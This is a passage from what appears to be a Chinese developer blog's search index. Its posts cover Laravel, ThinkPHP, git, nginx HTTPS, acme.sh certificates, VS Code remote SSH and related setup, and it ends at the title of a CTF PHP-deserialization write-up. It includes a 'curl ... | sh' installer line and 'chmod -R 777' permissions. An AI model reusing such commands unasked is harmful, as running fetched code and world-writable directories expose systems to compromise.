&quot;multy1&quot;;});//响应一切请求动作Route::any('multy2', function() { return &quot;multy2&quot;;}); 参数必选参数： 123Route::get('user/{id}', function ($id) { return &quot;User-id-&quot; . $id;}); 多个参数： 123Route::get('posts/{post}/comments/{comment}', function ($postId, $commentId) { //}); 可选参数： 设置默认值 参数后加 ? 123Route::get('user/{name?}', function ($name = &quot;moreant&quot;) { return 'User-name-' . $name;}); 正则约束链式调用 where 方法可以给路由添加正则约束 单个： 123Route::get('user/{name}', function ($name) { return 'User-name-' . $name;})-&gt;where('name','[A-Za-z]+'); 多个： 123Route::get('user/{id}/{name}', function ($id, $name) { //})-&gt;where(['id' =&gt; '[0-9]+', 'name' =&gt; '[a-z]+']); 全局约束 在 laravel\\app\\Providers\\RouteServiceProvider.php 的 boot 方法中可以定义全局约束 所有的id都只能为数字： 123456public function boot(){ Route::pattern('id', '[0-9]+'); parent::boot();} 可以在具体路由实例中覆盖全局约束 群组可以共享路由属性 中间件的群组，在 group 之前调用 middleware 方法： 123456789Route::middleware(['first', 'second'])-&gt;group(function () { Route::get('/', function () { // // 使用 first 和 second 中间件 }); Route::get('user/profile', function () { // // 使用 first 和 second 中间件 });}); 命名空间的群组，使用 namespace 方法将相同的 PHP 命名空间分配给路由组的中所有的控制器： 123Route::namespace('Admin')-&gt;group(function () { // 在 &quot;App\\Http\\Controllers\\Admin&quot; 命名空间下的控制器});","link":"/post/8294.html"},{"title":"ThinkPHP5学习笔记","text":"本文是 慕课网 快速入门ThinkPHP 5.0基础篇 的一个笔记。笔者使用的是WampServer环境，编辑器是VScode和Typora Readme信息author: Moreant create: 8/11/2019 email: 552191481@qq.com website: http://yeek.top 规范目录除非特殊说明，默认以tp5为根目录 章间三换行，节间二换行，小节间一换行 Markdown语言规范 h2 章节 h3 节 h4 小节 代码 单行代码，路径 斜体 文件名 粗体 重点 Markdown语法入门 安装与配置扩展配置方便将一类的配置信息集合在同一个php文件中 一般放在 app\\conf\\extra\\ 中 例如 email.php: 12345678910&lt;?php return[ 'host' =&gt; 'smtp@qq.com', 'name' =&gt; 'moreant@qq.com' ];//在配置信息中就会显示为'email' =&gt; array (size=2) 'app_email' =&gt; string '552191481qq.com' (length=15) 'app_author' =&gt; string 'Moreant' (length=7) config类和函数config类的使用 123456//1:在类前面指定根命名空间$res = \\think\\Config::get();dump($res);//2:在namespace下加上use \\think\\Config; 常用方法 config类 config助手函数 作用 get() config() 返回所有的配置信息 get(“database”) config(“database”) 返回database的配置信息 set(‘user’,‘moreant’) config(‘user’,‘moreant’) 设置user为moreant set(‘user’,‘moreant’,‘index’) config(‘user’,‘moreant’,‘index’) 指定是index的作用域 has(‘user’) config(‘?user’) 返回布尔值，存在为true 环境变量$_ENV 所有的环境变量， $_ENV['PHP_EMAIL'] PHP_EMAIL这项的配置信息 常见问题dump($_ENV) 数组为空 需要去 php.ini 文件下在把 variables_order = “GPCS” 在G的前面加上E，变成EGPCS 参考链接（待补） 不加载.env文件的内容 修改框架下的 thinkphp\\base.php 在 putenv(&quot;$name=$val&quot;); 下面加上两行 12$_ENV[$name] = $val;$_SERVER[$name] =$val; 分组的的配置不加载 修改框架下的 thinkphp\\base.php 在 putenv(&quot;$item=$v&quot;); 下面加上一行 1$_ENV[$item]=$v; 前缀与大写默认添加 PHP_ 作为前缀，并变为大写，例如： .env中是 email=moreant@qq.com ，在$_ENV中的key就为PHP_EMAIL。 分组12345678[database]hostname=localhostusername=rootpassword=root等价于：database_hostname=localhostdatabase_username=rootdatabase_password=root Env类的使用123456789101112//或缺email的值，如果不存在email则返回NULL，不会产生错误信息Env::get('email');//或者$_ENV['PHP_EMAIL'];//返回组内的某个值 Env::get('database.username');//或者Env::get('database_username');//可以传入第二个参数来指定默认值Env::get('email','morean@qq.com'); URL和路由入口文件应用入口文件一般指的是 public\\index.php 这个文件 123456789101112131415161718//默认是// 定义应用目录define('APP_PATH', __DIR__ . '/../application/');// 加载框架引导文件require __DIR__ . '/../thinkphp/start.php';---------------------- //一般设置为// 定义应用目录define('APP_PATH', __DIR__ . '/../app/');// 定义配置文件目录define('CONF_PATH',__DIR__.'/../conf/');// 加载框架引导文件require __DIR__ . '/../thinkphp/start.php'; 更多 define \\ 配置可以参考 thinkphp\\base.php 的12-31行的 **defined** 除非有bug，否则不要修改thinkphp文件夹下的文件 隐藏入口文件隐藏入口文件让url看起来更好看 对seo优化有好处 开启后支持将index.php/admin/index/index改写为admin/index/index 操作步骤 启动 rewrite 模块： 打开 apache 的 httpd.conf ，搜索： LoadModule rewrite_module modules/mod_rewrite.so 将前的 # 去掉。 启动读取重写信息： 打开 apache 的 httpd-vhosts.conf ，把站点配置信息中的 AllowOverride None 改为 AllowOverride All 重启 apache ps:我的 WampServer 默认已经启动了上面的模块。 入口文件的绑定在入口文件（index.php）中添加 1define('BIND_MODULE','admin/index/conf'); 打开public\\index.php就会直接进入admin模块下的index文件的conf方法 自动绑定打开自动绑定模块，在配置中添加 1auto_bind_module =&gt; ture 会自动访问与php文件名相同的模块，例如 api.php 会自动访问 api 模块 路由路由的作用是简化URL访问地址，并根据定义的路由类型做出正确的解析。 路由配置12345678// 是否开启路由'url_route_on' =&gt; true,// 路由配置文件（支持配置多个）'route_config_file' =&gt; ['route'],// 路由使用完整匹配'route_complete_match' =&gt; false,// 是否强制使用路由'url_route_must' =&gt; false, 在 conf/ 下创建 route.php 文件，内容如下 12345&lt;?php return[ 'news/' =&gt; 'index/index/index' 'news/:id' =&gt; 'index/index/info']; 访问： 1http://localhost/news 会自动路由到 1http://localhost/index/index/index 访问： 1http://localhost/news/4 会自动路由到 1http://localhost/index/index/info/5 且禁止直接访问 请求和响应接受和处理所有的请求 对象获取有三个方法可以获得请求对象： 助手函数 1$request = request(); Request类 1234//先 ues Request 类use think\\Request;$request = Request::instance(); 传参 12345//先 ues Request 类use think\\Request;public function index (Request $request){ } 参数获取例如文件 1app\\index\\controller\\index.php 访问URL 12345678910111213141516171819202122232425262728293031323334353637383940414243444546http://localhost/index/index/index/type/5.html?id=10&lt;?phpnamespace app\\index\\controller;use think\\Request; public function index(Request $request) { //获取URL的值 //域名 http://localhost dump($request-&gt;domain()); //路径 index/index/index/type/5.html dump($request-&gt;pathinfo()); //不带html的路径 dump($request-&gt;path()); //请求类型 GET dump($request-&gt;method()); //望文生义 返回类型为Boolean dump($request-&gt;isGet()); dump($request-&gt;isPOST()); dump($request-&gt;isAjax()); //5.0之后分path中的值不属于get //get的值 10 dump($request-&gt;get()); //get和path的值 10,5 dump($request-&gt;param()); //望文生义 返回类型为array dump($request-&gt;post()); dump($request-&gt;session()); dump($request-&gt;cookie()); //直接获得某项的值 dump($request-&gt;param('id')); dump($request-&gt;cookie('email')); //望文生义 dump($request-&gt;module()); dump($request-&gt;controller()); //操作 index dump($request-&gt;action()); } input函数响应对象","link":"/post/7661.html"},{"title":"URL的美化","text":"本站使用的博客框架是 Hexo ，其中默认的文章链接设置是这样的 :year/:month/:day/:title/ 具体到本片文章是这样的 2019/08/30/URL%e7%9a%84%e7%be%8e%e5%8c%96 。 这个URL有 3 层结构，而且中文经过了 URL编码 ，很长的 URL 一方面不利于传播分享，另一方面不利于搜索引擎的抓取(虽然国内搜索引擎不会抓GitHub的内容)。 v1.0在 Hexo 的官方文档中就有介绍 URL链接 的设置： 您可以在 _config.yml 配置中调整网站的永久链接或者在每篇文章的 Front-matter 中指定。 by: Hexo 官方文档——永久链接（Permalinks） 我使用了这篇文档中示例的： 1:category/:title.html 也就是 类型/标题 然后在文章的的 Front-matter 中指定 permalink： 1permalink: URLBeautification 这样，URL就变成了： 1mix/URLBeautification.html 简介，望文生义。但也存在问题： 需要制定 permalink ，否则中文标题还是会被 URL编码。 需要去找到对应的 permalink 标题，一般要去 Google翻译。 遇到两个类型的文章，URL就存在冲突 比如在 foreach的遍历效率高吗？ 中，一开始的类型是 java 和 php 。URL链接选择了 java ，链接是：java/forOrForeach.html ，但是这篇文章主要的内容还是 php ，URL 反而会导致对文章的误导。 v2.0然后去百度搜索了一下，找到现在这个解决方案： 使用 hexo-abbrlink 实现的方案，是： 对标题+时间进行 crc 然后用十进制或者十六进制表示，保存在front-matter中。 hexo-abbrlink介绍 只需要安装 hexo-addrlink in GitHub 1npm install hexo-abbrlink --save 然后在config.yml，修改permalink 1234permalink: post/:abbrlink.htmlabbrlink: alg: crc16 # 算法：crc16(default) and crc32 rep: dec # 进制：dec(default) and hex 这个是使用了各个算法、进制的效果 算法 进制 结果 crc16 hex https://post.zz173.com/posts/3ab2.html crc16 dec https://post.zz173.com/posts/12345.html crc32 hex https://post.zz173.com/posts/9a8b6c4d.html crc32 dec https://post.zz173.com/posts/1690090958.html by: abbrlink更新2.0.4说明 所以最终的链接是： 1https://moreant.github.io/post/8375.html 虽然不能从链接中得到关于文章的信息了，但是实现了： 自动生成唯一连接 短小精悍 是目前URL链接的最优解了","link":"/post/52295.html"},{"title":"VMware 设置手动固定 ip","text":"有时候为了另一种方便，需要将虚拟机指定为手动固定的 ip 地址。 环境VMware版本：15.1.0 实体机系统：Windows 1903 虚拟机系统：Windows 7 VMware 设置首先打开 虚拟机网络编辑机 然后选择 NAT 模式 ，子网 IP 自己定义 进入 DHCP 设置，起始 IP 地址 和 结束 IP 地址根据上面的 子网 IP 进行配置 Windows 设置进入网络连接，如图设置 坑 如果虚拟机没有成功设置，请检查是否选择了 NAT 模式 如果虚拟机始终是169.254.xxx.xxx，请检查是否与实体机或者其他虚拟机有ip地址冲突","link":"/post/23562.html"},{"title":"git 问题归纳","text":"收集 git 使用中遇到的各种奇奇怪怪的问题以及解决方案，请善用 Ctrl+F 搜索报错信息来查找。 git 基础git pull 冲突 报错信息 1error: Your local changes to the following files would be overwritten by merge 保留本地的方式修改 通过git stash将工作区恢复到上次提交的内容，同时备份本地所做的修改，之后就可以正常git pull了，git pull完成后，执行git stash pop将之前本地做的修改应用到当前工作区。 123git stashgit pullgit stash pop 远程强制覆盖本地 12git fetch --all //只是下载代码到本地，不进行合并操作git reset --hard origin/master //把HEAD指向最新下载的版本 服务器上的 git裸仓库中不允许混合重置 报错内容如下 1mixed reset is not allowed in a bare repository 解决方案 回到上一次 1git update-ref HEAD HEAD^ 回到某一次 1git update-ref refs/heads/branch-name branch-name^ 使用 sha1 1git update-ref refs/heads/branch-name a12d48e2 更多请参阅git-update-ref命令的文档。 或者腾讯云的中文文档 方案来源地址 栈越","link":"/post/19251.html"},{"title":"hexo-next-配置","text":"简单的介绍一下我是如何配置本博客的 博客设置是label danger@根目录下的 _config.yml 文件 站点信息1234567title: moreant's Blogsubtitle: 学习即输入输出description: 别教了，我学不动了keywords: 前端 后端 运维author: 莫居尘 Moreantlanguage: zh-CNtimezone: &quot;Asia/Shanghai&quot; 永久链接参见 URL的美化 上传至 GitHub1234deploy: type: git repo: git@github.com:moreant/moreant.github.io.git branch: master 主题设置我使用的是 next 主题，注意别下载到旧版了。 详细配置里面的注释很详细，请善用 Google 翻译","link":"/post/32411.html"},{"title":"nginx 强制转https","text":"有了 SSL 证书，就要好好的利用。 将 nginx 站点配置中原来监听的 80 端口拎出来，用来重定向到 https。 注释掉原先的 80 端口的监听 12345678910server { # listen 80 default_server; # listen [::]:80 default_server; listen 443 ssl ; listen [::]:443 ssl ipv6only=on; server_name *.example.top; // 其他配置略} 另起一个 80 端口监听用于重定向 1234567 server{ listen 80 default_server; listen [::]:80 ipv6only=on; server_name *.example.top; return 301 https://$server_name$request_uri;} 检测配置，重新加载 12nginx -tnginx -s reload 有多个站点的话就弄多个监听 80 端口的 server 12345678910111213 server{ listen 80 default_server; listen [::]:80 ipv6only=on; server_name www.example.top example.top *.example.top; return 301 https://$server_name$request_uri;}server{ listen 80 ; listen [::]:80 ; server_name www.example.com example.com *.example.com; return 301 https://$server_name$request_uri;}","link":"/post/10147.html"},{"title":"Nginx 添加 ssl证书","text":"简单的记一下在 laradock 中如何给 Nginx 添加 ssl证书 在站点配置文件原有的80端口的 server 中加入以下内容，其中注意需要修改的是两个证书文件的地址 12345678listen 443 ssl;# 注意文件的地址ssl_certificate /etc/nginx/ssl/3243201_yeek.top.pem;ssl_certificate_key /etc/nginx/ssl/3243201_yeek.top.key;ssl_session_timeout 5m;ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;ssl_protocols TLSv1 TLSv1.1 TLSv1.2;ssl_prefer_server_ciphers on;","link":"/post/18457.html"},{"title":"优雅的科学上网","text":"通过自定义 PAC 规则和 SwitchyOmega 插件，优雅的科学上网。当然首先你得自己找到科学上网的方法，然后才能讨论如何优雅。 酸酸乳 的作者已经很久没有更新了，其内置的 PAC规则 已经不能很好的与某墙同步了。 具体的体现就是使用 PAC规则 的时候，GitHub 的图片和raw代码经常 404 。 因此，就需要我们自己 手动设置 PAC规则 了 主要参考的是 某中文网 的设置（访问需要梯子） 各平台PAC/ACL规则文件设置 如果有打不可以的页面或者无法获取等情况，说明 需要梯子 。 Windows 下的配置 右键->另存为 下载规则，改名为 pac.txt 替换掉到 酸酸乳 安装目录中的 pac.txt 。 或者直接 复制粘贴 到酸酸乳安装目录中的 pac.txt 中。 选择代理模式为PAC模式。 xxxlist.pac 支持更新规则的项目 Android 下的配置在下面这个项目中挑选适合你的规则，接着在客户端的 路由 中选择 自定义ACL文件 ，在弹出的窗口中填入 规则连接 即可。 ACL4SSR Chrome 和 FireFox 下的配置推荐使用 SwitchyOmega 这个插件，如果遇到 PAC 没有及时更新的域名，可以字节添加规则","link":"/post/23204.html"},{"title":"使用 Git 优雅的自动化更新 Laravel 项目","text":"自从使用 Laravel 框架之后，面对庞大的文件夹结构，再用 FTP 手动覆盖源文件更新网站的方法实在是太憨了。因此想到使用 Git 和 hook 就可以自动化更新和管理 Laravel项目 了，更别提 Git 本职的版本管理能减少意外翻车时的损失了。 无论如何，都要先去了解一下 Git 的基本使用，否则你会大概率听不懂我在讲什么： Git入门必看：廖雪峰的Git教程 Git最佳实践：Git 菜单 Git之道文档：Pro Git 前言本文将在 CentOS 7.6 使用 2.0 版本以上的 git ，建立一个新的 裸仓库 利用 Hook(钩子) 来实现对 Laravel 为框架的项目实现自动化部署，管理。 目录结构当前我服务器的的 web目录 是这样的 laradock——基于 docker 的环境部署轮子 yeek——站点目录 yeek.git——git仓库 Q &amp; AQ: 为什么使用 2.0 版本以上的 git 。 **A:**因为貌似低版本的 git 不支持密钥登录，导致每次更新都账号密码，要这很不方便。 **Q:**为什么使用 钩子+裸仓库 而不直接在服务器上建一个仓库，与开发环境（本地）进行同步。 A: Git默认拒绝向非裸仓库push (参考)，网上大把能解决这个问题的，但都特别折腾 所以正确的方式是，在服务器上建立裸仓库，然后在本地push到服务器，接着在站点目录 clone 裸仓库是。 添加秘钥在云服务器的根目录下的 home 文件夹下创建一个git文件夹 1mkdir /home/git 切换到创建好的git文件夹 1cd /home/git 创建 .ssh文件夹，里面主要用来放公钥 1mkdir .ssh 切换到.ssh文件夹并创建authorized_keys文件 12cd .sshtouch authorized_keys 然后在本地计算机里将 .ssh 文件夹里的 id_rsa.pub 中的内容复制到云服务器的 authorized_keys 文件中。 如果你的用户名目录下没有 .ssh 文件夹，请执行下面的指令，然后按三下回车。 1ssh-keygen 创建仓库和设置 hook在目录中创建一个裸仓库，然后给予权限 12git init --bare /web/yeek.gitchown -R git:git yeek.git 如果没有 git 用户，就新建一个 1sudo adduser git 克隆刚刚新建的仓库，给写入权限 12git clone yeek.gitchown -R git yeek 进入裸仓库，添加钩子 123cd /web/yeek.git/hookstouch post-receivevim post-recive 粘贴以下内容 1234567891011121314#!/bin/sh# 打印输出echo '======上传代码到服务器======'# 打开线上项目文件夹cd /www/wwwroot/test/website# 这个很重要，如果不取消的话将不能在cd的路径上进行git操作unset GIT_DIRgit pull origin master# 自动编译vue项目,如有需要请去掉前面的#号# npm run build# 自动更新composer（我暂时没试过）# composer updateecho $(date) &gt;&gt; hook.logecho '======代码更新完成======' 保存退出后添加执行权 1chmod +x post-receive 安装项目如果本地已有项目创建仓库，添加文件，提交（如果之前设置可以直接忽略） 123git initgit add .git commit -m&quot;first commit&quot; 设置远程仓库，push到服务器 12git remote origin git@服务器地址:仓库位置git push origin master 如果本地没有项目从服务器克隆到本地 1git clone git@服务器地址:仓库位置 开发完成后，添加文件，提交，push到服务器 123git add .git commit -m&quot;first commit&quot;git push 对于 laravel 项目laravel 项目的clone等操作并不会同步所有文件，还需要进入到目录里进行初始化 1234composer installcp .env.example .envphp artisan key:generatesudo chmod -R 777 storage bootstrap/cache 如果是 laradock，123 是在 workspace 容器中执行的，4是在服务器上执行的 同步到 GitHub我还希望更新服务器的时候能同时更新到 GitHub ，所以在上面的 hook 末尾加上下面的脚本，保存退出 123echo '======推送到 GitHub 开始======'git push github masterecho '======推送到 GitHub 完成======' 将 home 下的 git 文件夹里所有的文件所有者设置为 git 1chown git:git -R /home/git/ 切换到git用户，创建 ssh 秘钥，三连回车即可 12su gitssh-keygen 将 home/git/.ssh/id_rsa.pub 文件的内容复制到 GitHub 上的 SSH and GPG keys 中 进入项目目录 /web/yeek 添加GitHub的仓库地址，可以尝试一下手动推送 12git remote add github 仓库地址git push github 自此，已经完成了以 git 为基础的的自动化更新以及自动推送","link":"/post/61887.html"},{"title":"使用 acme.sh 配置泛域名 https","text":"在服务商里，一张泛域名的 SSL 证书需要 1700￥。免费的 SSL 只支持单域名，并且一个主域名最多申请 20 次 而 acme.sh 利用 acme 协议，可以在 letsencrypt 全自动且免费的申请证书。 前言申请泛域名证书需要使用 DNS API ，请确认你的 DNS 供应商在 acme.sh 的支持范围内 本文以阿里云为例 如果你只需要单域名的证书，其实官方的 中文文档 已经足够了，可以用更简单的 HTTP 方法。 本文主要参考自简书的 acme.sh 配合 letsencrypt 配置泛域名 安装 acme.sh在服务器中执行以下指令，会将 acme.sh 安装到 ~/ 目录中 1curl https://get.acme.sh | sh 创建 一个 bash 的 alias, 方便你的使用 1alias acme.sh=~/.acme.sh/acme.sh acme.sh 自动为你创建 cronjob, 每天 0:00 点自动检测所有的证书, 如果快过期了, 需要更新, 则会自动更新证书. 可以执行以下指令看到自动脚本 1crontab -l 创建 Accesskey图方便的话，可以使用全局 Accesskey。 为了安全，也是为了方便管理，最好创建一个专门用于 acme.sh 的子账号来生成 Accesskey https://ram.console.aliyun.com/users/new 复制并保存创建好的 AccessKey 和 AccessKeySecret 后，给新用户添加 DNS API 权限 申请证书在 ~/.acme.sh 中进行 Key 和 Secret 的设置 12export Ali_Key=&quot;thisIsYouKey&quot;export Ali_Secret=&quot;thisIsYouSecret&quot; acme.sh 会自动保存到 ~/.acme.sh/account.conf 中，方便以后再次使用。 发起申请，记得修改成你的域名： 1acme.sh --issue --dns dns_ali -d *.example.com 之后会利用 DNS API 添加一条 txt 解析用于验证，验证过后会自动删除。 申请成功后，证书会生成在 ~/.acme.sh/*.example.com。 别自己复制到 Nginx 目录里了，以后续订不会自动更新 Nginx 目录中的。 使用证书这里仅介绍 Nginx 的使用， Apache以及其他的 web 服务可以在官方wiki中找到相关设置。 首先开启 Nginx 的证书使用。 1234listen 443 ssl default_server;listen [::]:443 ssl default_server ipv6only=on;ssl_certificate /etc/nginx/ssl/example.com/cert.pem;ssl_certificate_key /etc/nginx/ssl/example.com/key.pem; 输入以下指令创建对应的空白证书文件 123mkdir /etc/nginx/ssl/touch /etc/nginx/ssl/example.com cert.pemtouch /etc/nginx/ssl/example.com key.pem 接着输入以下指令写入到 Nginx 的证书目录中。记得修改成你的目录，如果没有就自己挑个位置。 \\ 代表转义换行符，所以下面是一条指令 1234acme.sh --installcert -d *.example.com \\--key-file /etc/nginx/ssl/example.com/key.pem \\--fullchain-file /etc/nginx/ssl/example.com/cert.pem \\--reloadcmd &quot;nginx -s reload&quot; 终端中显示 Reload success 就可以使用 https 访问了 最后，如果你想使用其他高级功能，建议去看官方的 wik，也顺便给个 start 吧。 https://github.com/Neilpang/acme.sh/wiki","link":"/post/25493.html"},{"title":"使用 VS Code 远程连接服务器","text":"之前使用 VS Code 远程连接服务器之后，不仅编辑文件非常方便，看目录结构和下载文件都非常方便。最近换了电脑，发现没有记下相关的设置，所以现在记录一下。 VS Code 远程连接首先，VS Code 需要安装相应的插件 Remote - SSH 介绍页面 在左侧栏会多出一个按钮，进入后点击设置按钮 这里选择用户名下的 .ssh 文件夹，因为这台电脑的其他用户不需要远程连接。 然后在 config 文件中填写远程连接的信息 Host 远程连接的名称 HostName 远程连接的ip地址 User 远程连接的用户名 IdentityFile 远程连接的私钥路径(可选) 之后点击这个进行远程连接了 连接成功后，就可以选择打开服务器上的文件夹了 使用秘钥登录如果你没有使用秘钥登录，则每次连接服务器的时候都需要输入密码，比如重启和更换目录。 关于登录秘钥的设置可以参考下面这篇文章 CentOS 使用秘钥登录 注意事项缓存认证第一次远程连接会询问你是否保存认证缓存，直接选第一个就行了 连接报错我遇到了 Bad owner or permissions on C:\\Users\\Administrator/.ssh/config 报错的问题，解决办法就是将 config 文件的路径写在 Remote-ssh 插件的 Config File 属性里，然后重启vscode 之后我还是遇到了这种问题，实在被烦到不行，在设置中换成了 Git 的 ssh 使用私钥登录如果不指定私钥的地址，就需要在每次远程连接时输入密码，这是一件非常麻烦的事情。如何在服务器里开启私钥登录，可以去菜鸟教程里了解 《设置 SSH 通过密钥登录》","link":"/post/19479.html"},{"title":"修改右键新建菜单","text":"经常使用 经常需要新建 markdown 文件，每次都要改后缀实在太麻烦了。 何不在新建菜单里添加 md 格式呢？ 本文主要参考一方天地的博客 windows 修改右键新建菜单 操作都需要打开注册表。 Win + R 输入 regedit ，打开注册表编辑器 修改菜单进入计算机\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Discardable\\PostSetup\\ShellNew下的 Classes 字符串项，双击直接修改。 这里我添加了 .md 后缀 接着需要修改权限，防止被系统改回去 右键 ShellNew 项（文件夹），选择 权限 -&gt; 高级 -&gt; 关闭继承 -&gt; 将已继承的权限…… 双击编辑权限条目，去掉 SYSTEM、当前用户、Administrator 的 完全控制。 最后入下图即可 之后再想修改列表，需要开启 当前用户 的权限才可以修改。 添加后缀仅仅在右键菜单里添加是不行滴，还得到后缀里添加到新建菜单才行。 下面是一个将 .md 添加到新建菜单的例子（需要提前安装 typora） 12345678Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\\.md]@=&quot;typora.md&quot;[HKEY_CLASSES_ROOT\\.md\\ShellNew]&quot;NullFile&quot;=&quot;&quot;&quot;FileName&quot;=&quot;temp.md&quot; 新建一个 txt 文件，将上面的内容复制进去保存。改后缀名为 .reg ，执行。 完事。 如果翻车了，可能会导致 资源管理器 崩溃。 得去 计算机\\HKEY_CLASSES_ROOT 里找到对应的后缀文件夹，删除添加进去的内容 别傻憨憨的用滚轮找，注册表编辑器里 Ctrl + F可以查找，地址栏也有补全。","link":"/post/61502.html"},{"title":"分享B站视频时如何定位到具体时间","text":"总所周知，B站视频的 url 一般是这样的 1https://www.bilibili.com/video/av38657363 偶然发现在历史记录中的 url 带了个 t 参数，可以定位到视频的时间并且自动播放。 eg: https://www.bilibili.com/video/av89085561?t=121 当然，仅限于 PC 端。","link":"/post/8085.html"},{"title":"换源合集","text":"混 IT 的谁没换过源呢？ composer 换阿里源全局替换 1composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ 仅替换当前项目 1composer config repo.packagist composer https://mirrors.aliyun.com/composer/ npm 切换阿里云源1npm config set registry https://registry.npm.taobao.org/ 查看是否切换成功 1npm config get registry maven 换阿里源(IDEA)进入 IDEA 的安装目录下的 plugins/maven/lib/maven3/conf/settings.xml 添加以下内容到 &lt;mirros&gt; 中 123456&lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt;","link":"/post/8108.html"},{"title":"接手项目的各种坑","text":"接手项目导入时遇到的坑 IDEA运行报Command line is too long vue 编译时堆栈溢出如： &lt;— Last few GCs —&gt; 1. IDEA运行报Command line is too long修改项目下 .idea\\workspace.xml，找到标签 &lt;component name=&quot;PropertiesComponent&quot;&gt; ， 在标签里加一行 1&lt;property name=&quot;dynamic.classpath&quot; value=&quot;true&quot; /&gt; 2. vue 堆栈溢出在编译时出现以下错误 12345&lt;--- Last few GCs ---&gt;……FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory 直接在package.json替换scripts下的serve指令内容： &quot;serve&quot;: &quot;npx --max_old_space_size=4096 vue-cli-service serve&quot; 开发时运行npm run serve或yarn serve即可。 参考地址：https://zhuweisheng.com.cn/framework/vue-cli-leap-out/","link":"/post/54002.html"},{"title":"改造微信小程序的地狱回调","text":"微信的 API 经常会传入 success、fail 之类的回调函数，逻辑简单时还好，一旦复杂起来，简直就是回调地狱。还好小程序现在已经支持 async/await 了 基础知识建议阅读以下文章了解基础知识，否则你可能会看不懂我在说什么 Javascript异步编程的4种方法 async 函数的含义和用法 Promise 回调地狱什么叫回调地狱，这就叫回调地狱，总共有 两个回调函数，三个Promise对象嵌套，你找全了吗。 123456789101112131415161718192021222324252627282930313233343536// userInfos 是数据库中 userInfo 的集合 setUserInfo(event) { wx.getSetting({ success: (res) =&gt; { if (!!res.authSetting[&quot;scope.userInfo&quot;]) { wx.getUserInfo({ lang: 'zh_CN', success: (res) =&gt; { const userInfo = res.userInfo wx.cloud.callFunction({ name: 'getOpenId' }).then(res =&gt; { userInfos.where({ _openid: res.result.openId }).count().then(res =&gt; { if (res.total === 0) { userInfos.add({ data: event.detail.userInfo }).then(() =&gt; { Toast.success('注册成功') wx.reLaunch({ url: '/pages/my/my', }) }) } else { Toast.success('登录成功') wx.reLaunch({ url: '/pages/my/my', }) } }) }) }, }) } else { Toast.fail('请允许') } }, }) }, 分离嵌套改造回调函数最外层的 wx.getSetting 的回调函数开始改起 1234567891011setUserInfo(event) { wx.getSetting({ success: (res) =&gt; { if (!!res.authSetting[&quot;scope.userInfo&quot;]) { // 授权了信息 } else { // 没授权信息 } } }) } 分离首先 wx.getSetting 这个方法分离出去 12345678910111213141516setUserInfo(event) { // res 是 wx.getSetting 方法的 success 回调方法中的 res 对象 if (!!res.authSetting[&quot;scope.userInfo&quot;]) { //授权了信息 } else { //没授权信息 }}getSetting() { wx.getSetting({ success: (res) =&gt; { } })}, 使用 Promise 对象接着要怎么获得 success 回调方法中 res 对象呢？ 这个时候就要使用 Promise 对象了，匿名函数中的resolve 和 reject 会帮我们分别传出 成功 和 失败 的值。 123456789101112131415161718setUserInfo(event) { // res 是 wx.getSetting 方法的 success 回调方法中的形参 if (!!res.authSetting[&quot;scope.userInfo&quot;]) { //授权了信息 } else { //没授权信息 }}getSetting() { return new Promise((resolve, reject) =&gt; { wx.getSetting({ success: (res) =&gt; { resolve(res) } }) })}, async/await 异步/等待此时在 setUserInfo 里直接调用 this.getSetting() 的结果是 undefined！ 这是因为 wx.getSetting 是一个异步的 耗时操作 ，调用 success 方法 123456789101112131415161718setUserInfo(event) { // res 是 wx.getSetting 方法的 success 回调方法中的形参 if (!!res.authSetting[&quot;scope.userInfo&quot;]) { //授权了信息 } else { //没授权信息 }}getSetting() { return new Promise((resolve, reject) =&gt; { wx.getSetting({ success: (res) =&gt; { resolve(res) } }) })}, 123456789101112131415161718192021async setUserInfo(event) { const setting = await this.getSetting() if (!!setting[&quot;scope.userInfo&quot;]) { //授权了信息 } else { //没授权信息 }}getSetting() { return new Promise((resolve, reject) =&gt; { wx.getSetting({ success: (res) =&gt; { resolve(res.authSetting) }, fail: (res) =&gt; { reject(res) } }) })}, 分离 Promise 对象1234567891011121314async setUserInfo(event) { const setting = await this.getSetting() if (!!setting[&quot;scope.userInfo&quot;]) { // Promise wx.cloud.callFunction({ name: 'getOpenId' }).then(res =&gt; { // 接着怎么做 }) } else { //没授权信息 }} 分离后 1234567891011121314151617181920async setUserInfo(event) { const setting = await this.getSetting() if (!!setting[&quot;scope.userInfo&quot;]) { const _openid = await this.getOpenId() // 接着怎么做 } else { //没授权信息 }},async getOpenId() { try { const res = await wx.cloud.callFunction({ name: 'getOpenId' }); return res.result.openId; } catch (error) { return error; }}, 改造结果12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576async setUserInfo(event) { const setting = await this.getSetting() // 是否授权了用户信息 if (!!setting[&quot;scope.userInfo&quot;]) { const userInfo = await this.getUserInfo() const url = '/pages/my/my' // 是否注册过 if (!await this.isRegistered()) { // 没注册就插入一条 await userInfos.add({ data: userInfo }) } wx.reLaunch({ url }) } else { Toast.fail('请允许') }},/** * 获取用户设置 */getSetting() { return new Promise((resolve, reject) =&gt; { wx.getSetting({ success: (res) =&gt; { resolve(res.authSetting) }, fail: (res) =&gt; { reject(res) } }) })},/** * 获取用户信息 */getUserInfo() { return new Promise((resolve, reject) =&gt; { wx.getUserInfo({ lang: 'zh_CN', success: (res) =&gt; { resolve(res.userInfo) }, fail: (res) =&gt; { reject(res) } }) })},/** * 获取 openid */async getOpenId() { try { const res = await wx.cloud.callFunction({ name: 'getOpenId' }) return res.result.openId; } catch (error) { return error; }},/** * 是否已注册 */async isRegistered() { const _openid = await this.getOpenId() try { const res = await userInfos.where({ _openid }).count() return res.total } catch (error) { return error }}","link":"/post/22871.html"},{"title":"攻防世界 WEB Web_php_unserialize","text":"0x00 - 题目描述地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1 PHP 反序列，老题新做了。 打开 index.php 是这样的 0x01 - 